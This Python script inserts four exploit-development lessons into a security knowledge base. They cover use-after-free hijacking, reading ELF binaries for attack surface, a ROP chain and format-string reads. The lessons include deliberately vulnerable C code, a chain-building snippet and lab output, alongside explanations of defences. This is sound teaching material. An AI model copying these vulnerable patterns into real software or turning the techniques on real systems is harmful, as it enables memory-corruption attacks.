#!/usr/bin/env python3
"""Offensive Security worked examples — batch 2 (Exploit Development).

Mined from .archive/labs/ using the recipe in mine-offsec.py: commands and
output kept verbatim, setup/cleanup framing dropped, `echo`-the-lesson steps
rewritten as prose, interpretation added under each output block.
"""
import re
import sys

HEAP = '''## Worked Example: Freed Memory Comes Back, and the Stale Pointer Still Works

A use-after-free needs two things the allocator provides for free: memory that
gets recycled, and a pointer nobody invalidated.

**The specimen.** A struct whose first member is a function pointer:

```c
typedef struct { void (*action)(void); char name[24]; } Obj;
void normal(void){ puts("normal action"); }
void win(void){ puts("UAF-HIJACK"); }

int main(void){
    Obj *o = malloc(sizeof(Obj));
    o->action = normal;
    free(o);                              // (1) freed — 'o' is now dangling
    char *reclaim = malloc(sizeof(Obj));  // (2) same size reclaims the same slot
    *(void**)reclaim = (void*)win;        // (3) write a pointer where 'action' was
    o->action();                          // (4) call through the stale pointer
    return 0;
}
```

```shell-session
analyst@lab:/tmp/uaf-lab$ gcc -O0 -w uaf.c -o uaf && ./uaf
UAF-HIJACK
```

Four lines, four steps, and the program executed a function it never intended to
call. `free(o)` returned the object's memory to the allocator but left `o`
holding the address. The next same-size `malloc` handed that exact slot back.
Writing eight bytes at its start landed precisely where `action` used to live,
because `action` is the first member. Calling `o->action()` then dereferenced a
pointer the attacker chose.

**The reclaim is the whole mechanism**, and it is easy to prove in isolation:

```shell-session
analyst@lab:/tmp/uaf-lab$ ./addr
freed=0x55a4f82a02a0  reallocated=0x55a4f82a02a0  same=YES
```

Same address. Allocators recycle aggressively because it is fast and cache-
friendly — a freed chunk of a given size is the first candidate for the next
request of that size. That behaviour is correct and desirable; the bug is
entirely in the stale pointer that still aliases it.

Note what makes this class harder to defend than a stack overflow: nothing was
overflowed, no bounds were exceeded, and no canary sits between anything. The
write was perfectly in-bounds for `reclaim`. Nulling the pointer after `free`
closes this specific case; a memory-safe language removes the class; and in
between, a hardened allocator that delays reuse plus CFI on indirect calls raises
the cost without eliminating it.

'''

ELF = '''## Worked Example: Reading a Binary for Its Attack Surface

Before any exploit plan, the format itself answers three questions: are the
addresses fixed, which memory is writable, and which writable memory is
dereferenced as code.

**Is it PIE?**

```shell-session
analyst@lab:/tmp/fmt-lab$ readelf -h p | grep -E 'Type|Entry point|Machine'
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x401050
```

`EXEC` rather than `DYN` means this binary is **not** position-independent, so it
loads at a fixed base and `0x401050` is where it starts every single run. Every
address inside it is therefore a constant an exploit can hardcode. A `DYN` type
would mean the loader relocates it and those addresses change per execution,
which turns a one-line chain into a problem requiring an information leak first.

**Which writable memory gets called as code?**

```shell-session
analyst@lab:/tmp/fmt-lab$ readelf -r p | grep -iE 'JUMP_SLOT'
000000404018  000100000007 R_X86_64_JUMP_SLOT  0000000000000000 puts@GLIBC_2.2.5 + 0

analyst@lab:/tmp/fmt-lab$ readelf -l p | grep -E 'LOAD|GNU_RELRO'
  LOAD    0x0000000000001000  ...  R E
  LOAD    0x0000000000003db8  ...  RW
  GNU_RELRO 0x0000000000003db8 ...  R
```

The `puts` call does not jump directly to libc. It jumps through a slot in the
Global Offset Table at `0x404018`, and that slot lives in the `RW` LOAD segment.
So a write primitive that reaches `0x404018` redirects every future `puts` call
in the program — no stack corruption required.

Meanwhile `.text` is `R E`: readable and executable but never writable. That is
W^X, and it is why injected shellcode on the stack does not run and why code
reuse became the dominant technique.

The `GNU_RELRO` line is the one that decides whether the GOT attack is available
at all. RELRO marks part of that writable region read-only after the dynamic
linker finishes. Under **Full** RELRO the GOT is resolved eagerly and then locked,
and the write target disappears; under **Partial** RELRO it stays writable for
lazy binding. Checking which one you are facing is not a formality — it is the
difference between a working plan and a wasted afternoon.

'''

ROP = '''## Worked Example: Computation Assembled From Code That Was Already There

With NX enabled, injected shellcode on the stack will not execute. Code reuse
sidesteps that by never injecting code at all — only addresses.

**The specimen** is built non-PIE with NX on, and contains a target function that
checks its argument, plus a deliberately symbol-named gadget so it can be located
without a gadget finder:

```c
void win(unsigned long magic){
    if (magic == 0xdeadbeefUL) puts("ROP-CHAIN");
    else puts("wrong argument");
}
void vuln(void){ char b[32]; gets(b); }              // the overflow
__asm__(".global pop_rdi_ret\\npop_rdi_ret:\\n pop %rdi\\n ret\\n");
```

**The gadget is real machine code**, not a metaphor:

```shell-session
analyst@lab:/tmp/rop-lab$ objdump -d --disassemble=pop_rdi_ret -M att vuln | grep -E 'pop|ret'
  401176:  5f    pop    %rdi
  401177:  c3    ret
```

Two bytes. `pop %rdi` takes the next value off the stack into `RDI` — the
register the System V ABI reserves for a function's first argument — and `ret`
transfers control to whatever the stack holds next. A gadget is useful precisely
because it ends in `ret`: control comes back to the stack, which the attacker
owns.

**The chain** is three stack slots after the padding:

```python
pad   = b'A' * 40                        # 32-byte buffer + 8 saved RBP
chain  = struct.pack('<Q', pop_rdi_ret)  # vuln's ret lands here
chain += struct.pack('<Q', 0xdeadbeef)   # popped into RDI
chain += struct.pack('<Q', win)          # the gadget's ret lands here
```

```shell-session
analyst@lab:/tmp/rop-lab$ ./vuln < chain.bin
input:
ROP-CHAIN
```

Trace the control flow, because the stack is doing double duty as both data and
an instruction list. `vuln` returns into the gadget. The gadget pops
`0xdeadbeef` into `RDI` and returns into `win`. `win` reads `RDI`, finds the
value it wanted, and prints. At no point did the CPU execute a byte the attacker
supplied — it executed the program's own instructions, in an order the program's
author never intended.

That distinction is why NX did not help here, and why the defences that do help
are the ones that constrain *control flow* rather than memory permissions: a
shadow stack (CET) that notices `ret` going somewhere `call` never came from, or
CFI that rejects an indirect transfer to a non-entry point. ASLR helps too, but
only by making the addresses unknown — which is why real chains begin with a
leak.

'''

FMT = '''## Worked Example: One Misused printf Is an Arbitrary Read

The bug is a single missing format string, and it is easy to look at without
seeing:

```c
if (fgets(in, sizeof in, stdin)) printf(in);   // user input AS the format string
```

`printf(in)` rather than `printf("%s", in)`. The compiler accepts it, it behaves
correctly for every input without a `%`, and it hands the attacker the format
parser.

**Confirming the bug** takes one line — if the specifiers are interpreted rather
than printed, the program is reading arguments that were never passed:

```shell-session
analyst@lab:/tmp/fmt-lab$ echo 'AAAA %p %p %p %p' | ./fmt | head -1
say something: AAAA 0x7ffd4c1a2e50 0x7f3a9c8d5760 0x1 0x7ffd4c1a2f38
```

`printf` believes it was given four pointer arguments. It was given none, so it
reads whatever occupies the argument registers and then walks up the stack. Those
are real values from the process, printed to the attacker.

**Turning it into a targeted read.** Positional specifiers (`%N$x`) address a
specific slot instead of walking one at a time:

```shell-session
analyst@lab:/tmp/fmt-lab$ for i in $(seq 1 10); do printf "%%%d\\$x" $i | ./fmt | head -1; done | grep -i c0decafe
say something: c0decafe
```

The value `0xC0DECAFE` was a local variable in `main`. Nothing passed it to
`printf`; the format string reached up the stack and read it. On a real target
that same primitive leaks a stack canary — defeating the canary check — or a libc
pointer, defeating ASLR. And `%n`, which *writes* the number of bytes printed so
far to a pointed-to address, converts the same bug into an arbitrary write.

**The fix, and why it is verifiable:**

```shell-session
analyst@lab:/tmp/fmt-lab$ echo 'AAAA %p %p %p' | ./fmt_fixed | head -1
say something: AAAA %p %p %p
```

The specifiers now appear literally, because the input is an argument rather than
the format. Compiling with `-Wformat-security` rejects the original pattern at
build time, which is where this class should be caught — it is one of the few
memory-safety bugs a compiler can reliably find by inspection.

'''

WORK = {
    "Offensive Security/Exploit Development/Memory Corruption Exploitation/Heap Exploitation & Use-After-Free.md": HEAP,
    "Offensive Security/Exploit Development/Exploit Foundations & Architecture/Executable Formats: ELF, PE & Mach-O.md": ELF,
    "Offensive Security/Exploit Development/Exploit Construction & Control Flow/Code-Reuse Attacks (ROP, JOP & SROP).md": ROP,
    "Offensive Security/Exploit Development/Memory Corruption Exploitation/Integer, Type Confusion & Format String Bugs.md": FMT,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection)", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def apply_to(text, section):
    m = ANCHOR.search(text)
    if not m:
        return text, "NO ANCHOR"
    out = text[:m.start()] + section + text[m.start():]
    out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
    n = [0]

    def renum(mm):
        n[0] += 1
        return f"## Task {n[0]} — {mm.group(1)}"

    return ANY_TASK.sub(renum, out), f"ok, {ANY_TASK.subn(renum, out)[1]} tasks"


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        out, how = apply_to(src, sec)
        ok = out != src
        print(f"  {'✓' if ok else '✗'} [{how}] {rel.split('/')[-1]}")
        if ok and apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
